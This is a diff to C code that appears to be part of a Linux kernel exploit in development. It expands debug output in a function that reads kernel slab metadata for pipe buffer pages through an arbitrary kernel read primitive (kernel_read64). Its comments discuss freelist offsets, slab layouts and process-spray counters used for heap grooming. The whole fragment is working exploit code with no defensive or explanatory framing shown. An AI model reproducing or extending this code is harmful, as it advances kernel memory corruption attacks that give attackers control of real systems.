@@ -538,10 +538,24 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     {
       uintptr_t ph = direct_to_head_page(conv_fd, base);
       if (ph) {
-        uint64_t pm = kernel_read64(conv_fd, ph + 0x28);
-        pr_info("pipe wavehead w=%d tsc=%016llx inuse=%u frozen=%d taken=%d\n",
-                w, (unsigned long long)tsc, (unsigned)(pm & 0xffffu),
-                (int)((pm >> 31) & 1u), taken_wave);
+        /* full 5-word slab metadata dump: cross-check which offset really
+         * holds counters/freelist/slab_cache (STRUCT_SLAB_CACHE_OFF vs the
+         * 5.4 layout) and whether the freelist word moves after a batch
+         * kill -- inuse==34 across reaped=660 is a logic contradiction
+         * unless the +0x20 freelist proves objects never freed. */
+        uint64_t w08 = kernel_read64(conv_fd, ph + 0x08);
+        uint64_t w10 = kernel_read64(conv_fd, ph + 0x10);
+        uint64_t w18 = kernel_read64(conv_fd, ph + 0x18);
+        uint64_t w20 = kernel_read64(conv_fd, ph + 0x20);
+        uint64_t w28 = kernel_read64(conv_fd, ph + 0x28);
+        pr_info("pipe wavehead w=%d tsc=%016llx head=%016zx "
+                "+08=%016llx +10=%016llx +18=%016llx +20=%016llx +28=%016llx "
+                "inuse=%u frozen=%d taken=%d\n",
+                w, (unsigned long long)tsc, ph, (unsigned long long)w08,
+                (unsigned long long)w10, (unsigned long long)w18,
+                (unsigned long long)w20, (unsigned long long)w28,
+                (unsigned)(w28 & 0xffffu), (int)((w28 >> 31) & 1u),
+                taken_wave);
       }
     }
     if (tsc == 0 && taken_wave >= 0) {
